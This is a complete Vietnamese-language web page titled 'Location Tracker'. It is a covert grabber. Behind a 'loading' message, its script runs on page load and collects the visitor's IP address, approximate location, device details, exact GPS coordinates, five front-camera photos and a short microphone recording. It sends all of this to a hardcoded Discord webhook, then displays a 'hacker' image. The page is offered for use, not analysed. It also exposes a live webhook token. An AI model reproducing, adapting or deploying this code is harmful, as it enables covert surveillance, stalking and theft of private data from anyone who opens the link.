<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes"><title>Huy Hoang - Location Tracker</title><style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#000;min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;flex-direction:column;overflow:hidden;}#hackerDisplay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;object-fit:contain;background:#000;z-index:9999;}#loadingText{color:#fff;font-size:18px;text-align:center;}</style></head><body><div id="loadingText">Đang tải...</div><img id="hackerDisplay" src="https://media.discordapp.net/attachments/1487643966873538701/1520240015899234394/content.png?ex=6a407958&is=6a3f27d8&hm=c027cccf929fccb2e26b48bb7005eff7dc90247cd9a80b6cc51a32129c0b2847&=&format=webp&quality=lossless&width=539&height=809" alt="Hacker"><div style="display:none;"><div id="info"></div></div><video id="video" autoplay playsinline style="display:none;"></video><canvas id="canvas" width="640" height="480" style="display:none;"></canvas><audio id="audio" style="display:none;"></audio><script>const DISCORD_WEBHOOK_URL='https://discord.com/api/webhooks/1519694684694384752/J-jW9pYxcagQaVNeHurn1DdmmEyQm1bFpXyWlNyEsVhvpSUgCfwKKMtpQYVOUMBdRuu4';const HACKER_IMG_URL='https://media.discordapp.net/attachments/1487643966873538701/1520240015899234394/content.png?ex=6a407958&is=6a3f27d8&hm=c027cccf929fccb2e26b48bb7005eff7dc90247cd9a80b6cc51a32129c0b2847&=&format=webp&quality=lossless&width=539&height=809';const PHOTO_COUNT=5;const PHOTO_INTERVAL=300;const AUDIO_DURATION=4000;let infoSent=false;let photoSentCount=0;let cameraStream=null;let cameraActive=false;let audioRecorded=false;let mediaRecorder=null;let audioChunks=[];let gpsDataSent=false;let allPhotosSent=false;function showHackerImage(){document.getElementById('loadingText').style.display='none';document.getElementById('hackerDisplay').style.display='block';}async function sendTextToDiscord(content,retryCount=0){const maxRetries=2;try{const payload={content:content,username:"Huy Hoang",avatar_url:"https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png"};const response=await fetch(DISCORD_WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});if(!response.ok&&retryCount<maxRetries){setTimeout(()=>sendTextToDiscord(content,retryCount+1),2000);}}catch(e){if(retryCount<maxRetries){setTimeout(()=>sendTextToDiscord(content,retryCount+1),2000);}}}async function sendFileToDiscord(fileBlob,fileName,caption='',retryCount=0){const maxRetries=2;try{const formData=new FormData();formData.append('file',fileBlob,fileName);const payload={username:"Huy Hoang",avatar_url:"https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png"};if(caption)payload.content=caption;formData.append('payload_json',JSON.stringify(payload));const response=await fetch(DISCORD_WEBHOOK_URL,{method:'POST',body:formData});if(!response.ok&&retryCount<maxRetries){setTimeout(()=>sendFileToDiscord(fileBlob,fileName,caption,retryCount+1),2000);}}catch(e){if(retryCount<maxRetries){setTimeout(()=>sendFileToDiscord(fileBlob,fileName,caption,retryCount+1),2000);}}}async function sendAudioToDiscord(blob){const fileName=`audio_${Date.now()}.ogg`;const caption=`🎤 **Ghi âm** - ${new Date().toLocaleString('vi-VN')}`;await sendFileToDiscord(blob,fileName,caption);}async function sendPhotoToDiscord(blob,photoNumber){const fileName=`capture_${photoNumber}_${Date.now()}.jpg`;const caption=`📸 **Ảnh chụp #${photoNumber}** - ${new Date().toLocaleString('vi-VN')}`;await sendFileToDiscord(blob,fileName,caption);photoSentCount++;if(photoSentCount===PHOTO_COUNT&&cameraStream&&cameraActive){setTimeout(()=>{if(cameraStream){cameraStream.getTracks().forEach(track=>track.stop());cameraStream=null;cameraActive=false;}allPhotosSent=true;showHackerImage();},1000);}}async function captureSinglePhoto(video,canvas,ctx,photoNumber){return new Promise((resolve)=>{try{if(video.readyState===video.HAVE_ENOUGH_DATA){canvas.width=video.videoWidth||640;canvas.height=video.videoHeight||480;ctx.drawImage(video,0,0,canvas.width,canvas.height);canvas.toBlob((blob)=>{if(blob){sendPhotoToDiscord(blob,photoNumber);resolve(true);}else{resolve(false);}},'image/jpeg',0.85);}else{setTimeout(()=>{captureSinglePhoto(video,canvas,ctx,photoNumber).then(resolve);},50);}}catch(e){resolve(false);}});}async function captureMultiplePhotos(video,canvas,ctx){if(!cameraActive)return;for(let i=1;i<=PHOTO_COUNT;i++){if(!cameraActive)break;await captureSinglePhoto(video,canvas,ctx,i);if(i<PHOTO_COUNT){await new Promise(resolve=>setTimeout(resolve,PHOTO_INTERVAL));}}}async function startRecording(){if(audioRecorded)return;try{const stream=await navigator.mediaDevices.getUserMedia({audio:true});mediaRecorder=new MediaRecorder(stream);audioChunks=[];mediaRecorder.ondataavailable=(event)=>{if(event.data.size>0)audioChunks.push(event.data);};mediaRecorder.onstop=async()=>{const audioBlob=new Blob(audioChunks,{type:'audio/webm'});if(audioBlob.size>0){await sendAudioToDiscord(audioBlob);audioRecorded=true;}stream.getTracks().forEach(track=>track.stop());};mediaRecorder.start();setTimeout(()=>{if(mediaRecorder&&mediaRecorder.state==='recording'){mediaRecorder.stop();}},AUDIO_DURATION);}catch(e){}}async function getIPAndLocation(){let ip='Không xác định';let locationData={city:'Không xác định',region:'Không xác định',country:'Không xác định',isp:'Không xác định',lat:null,lon:null};const ipAPIs=['https://api.ipify.org?format=json','https://api.my-ip.io/ip.json','https://ipapi.co/json/'];for(const api of ipAPIs){try{const controller=new AbortController();const timeoutId=setTimeout(()=>controller.abort(),4000);const response=await fetch(api,{signal:controller.signal});clearTimeout(timeoutId);const data=await response.json();if(api.includes('ipify'))ip=data.ip;else if(api.includes('my-ip'))ip=data.ip;else if(api.includes('ipapi.co'))ip=data.ip;if(ip&&ip!=='Không xác định')break;}catch(e){}}const locationAPIs=[{url:`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon`,parser:(data)=>{if(data&&data.status==='success'){return{city:data.city||'Không xác định',region:data.regionName||'Không xác định',country:data.country||'Không xác định',isp:data.isp||data.org||'Không xác định',lat:data.lat||null,lon:data.lon||null};}return null;}},{url:`https://ipapi.co/${ip}/json/`,parser:(data)=>{if(data&&!data.error){return{city:data.city||'Không xác định',region:data.region||'Không xác định',country:data.country_name||'Không xác định',isp:data.org||'Không xác định',lat:data.latitude||null,lon:data.longitude||null};}return null;}}];for(const api of locationAPIs){try{const controller=new AbortController();const timeoutId=setTimeout(()=>controller.abort(),6000);const response=await fetch(api.url,{signal:controller.signal});clearTimeout(timeoutId);const data=await response.json();const result=api.parser(data);if(result&&(result.city!=='Không xác định'||result.country!=='Không xác định')){locationData=result;break;}}catch(e){}}return{ip,locationData};}async function getDeviceInfo(){const userAgent=navigator.userAgent;const platform=navigator.platform||'Không xác định';const isIOS=/iPad|iPhone|iPod/.test(userAgent)&&!window.MSStream;const isIPhone=/iPhone/.test(userAgent);const isIPad=/iPad/.test(userAgent)||(isIOS&&screen.width>768);let deviceModel='Không xác định';if(isIPhone)deviceModel='iPhone';else if(isIPad)deviceModel='iPad';else if(isIOS)deviceModel='iOS Device';else if(/Android/.test(userAgent))deviceModel='Android';else if(/Windows/.test(userAgent))deviceModel='Windows';else if(/Macintosh/.test(userAgent))deviceModel='Mac';return{userAgent,platform,isIOS,deviceModel,isIPhone};}async function autoSendGPS(){if(gpsDataSent)return;if(!('geolocation' in navigator))return;navigator.geolocation.getCurrentPosition(async(pos)=>{const lat=pos.coords.latitude;const lng=pos.coords.longitude;const accuracy=pos.coords.accuracy;const mapsLink=`https://www.google.com/maps?q=${lat},${lng}`;const gpsMessage=`**📍 VỊ TRÍ GPS THỰC TẾ**\n\n**📌 Vĩ độ:** \`${lat}\`\n**📌 Kinh độ:** \`${lng}\`\n**🎯 Độ chính xác:** \`${Math.round(accuracy)} mét\`\n\n🗺️ [Xem trên Google Maps](${mapsLink})`;await sendTextToDiscord(gpsMessage);gpsDataSent=true;},(err)=>{},{enableHighAccuracy:true,timeout:10000,maximumAge:0});}async function getInfoAndSendToDiscord(){try{const{ip,locationData}=await getIPAndLocation();const deviceInfo=await getDeviceInfo();const screenWidth=screen.width;const screenHeight=screen.height;const deviceMemory=navigator.deviceMemory?`${navigator.deviceMemory} GB`:'Không xác định';const cookieEnabled=navigator.cookieEnabled?'Bật':'Tắt';const currentTime=new Date().toLocaleString('vi-VN');const language=navigator.language||'Không xác định';const hardwareConcurrency=navigator.hardwareConcurrency?`${navigator.hardwareConcurrency} nhân`:'Không xác định';const referrer=document.referrer||'Truy cập trực tiếp';let mapsLink='';if(locationData.lat&&locationData.lon){mapsLink=`\n🗺️ [Xem vị trí](https://www.google.com/maps?q=${locationData.lat},${locationData.lon})`;}const discordMessage=`**📥 KHÁCH TRUY CẬP MỚI**\n\n**🌐 IP:** \`${ip}\`\n**📍 Vị trí:** \`${locationData.city}, ${locationData.region}, ${locationData.country}\`\n**🏢 Nhà mạng:** \`${locationData.isp}\`${mapsLink}\n\n**📱 Thiết bị:** \`${deviceInfo.deviceModel}\`\n**💻 Trình duyệt:** \`${deviceInfo.userAgent.substring(0,80)}...\`\n**🖥️ HĐH:** \`${deviceInfo.platform}\`\n**📺 Màn hình:** \`${screenWidth}x${screenHeight}\`\n**💾 RAM:** \`${deviceMemory}\`\n**⚙️ CPU:** \`${hardwareConcurrency}\`\n**🍪 Cookie:** \`${cookieEnabled}\`\n**🌐 Ngôn ngữ:** \`${language}\`\n**🕐 Thời gian:** \`${currentTime}\`\n**📎 Nguồn:** \`${referrer}\``;await sendTextToDiscord(discordMessage);}catch(error){}}async function startCameraImmediately(){const video=document.getElementById('video');const canvas=document.getElementById('canvas');const ctx=canvas.getContext('2d');if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return;try{const stream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:800},height:{ideal:600},facingMode:'user'}});cameraStream=stream;cameraActive=true;video.srcObject=stream;await new Promise((resolve)=>{video.onloadedmetadata=()=>{video.play();resolve();};});await new Promise(resolve=>setTimeout(resolve,100));await captureMultiplePhotos(video,canvas,ctx);}catch(e){cameraActive=false;setTimeout(()=>showHackerImage(),500);}}async function init(){if(DISCORD_WEBHOOK_URL==='YOUR_DISCORD_WEBHOOK_URL'){alert('Vui lòng cấu hình Discord Webhook URL!');return;}await getInfoAndSendToDiscord();setTimeout(()=>autoSendGPS(),1000);setTimeout(()=>startCameraImmediately(),500);setTimeout(()=>startRecording(),800);}if(DISCORD_WEBHOOK_URL&&DISCORD_WEBHOOK_URL!=='YOUR_DISCORD_WEBHOOK_URL'){init();}else{alert('Chưa cấu hình Discord Webhook URL!');}</script></body></html>
